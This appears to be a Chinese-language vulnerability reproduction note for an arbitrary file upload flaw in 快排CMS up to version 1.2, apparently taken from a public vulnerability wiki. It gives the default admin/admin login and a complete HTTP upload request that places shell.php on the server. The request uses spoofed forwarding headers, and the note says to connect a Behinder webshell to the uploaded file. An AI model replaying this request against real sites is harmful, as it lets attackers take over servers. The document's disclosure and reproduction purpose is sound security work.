---
title: "快排CMS 后台任意文件上传漏洞"
date: 2026-10-12 09:01:26
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "快排CMS"
tags:
  - "快排CMS"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

快排CMS 后台管理模块存在任意文件上传漏洞，攻击者通过漏洞可以控制服务器

## 漏洞影响

```
快排 CMS <= 1.2
```

## 环境搭建

https://gitee.com/qingzhanwang/kpcms

## 漏洞复现

登录页面如下, 默认账号密码为 **admin/admin**

```plain
http://xxx.xxx.xxx.xxx/admin.php/index/login.html
```



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170921790.png)

源码中没有对上传文件的后缀检测

```plain
thinkphp/library/think/File.php
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170922307.png)

任意找一处文件上传点

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170922296.png)

上传抓包获取文件地址

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170922533.png)

```plain
POST /admin.php/index/upload.html?dir=image HTTP/1.1
Host: 192.168.1.108:88
Content-Length: 935
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.108:88
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.108:88/admin.php/config/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

------WebKitFormBoundaryYIt9WaQZiDMrwAVm
Content-Disposition: form-data; name="localUrl"

C:\fakepath\shell.php
------WebKitFormBoundaryYIt9WaQZiDMrwAVm
Content-Disposition: form-data; name="imgFile"; filename="shell.php"
Content-Type: application/octet-stream

<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
?>

------WebKitFormBoundaryYIt9WaQZiDMrwAVm--
```

连接冰蝎木马即可

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/cms/images/202202170922800.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/%E5%BF%AB%E6%8E%92CMS-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
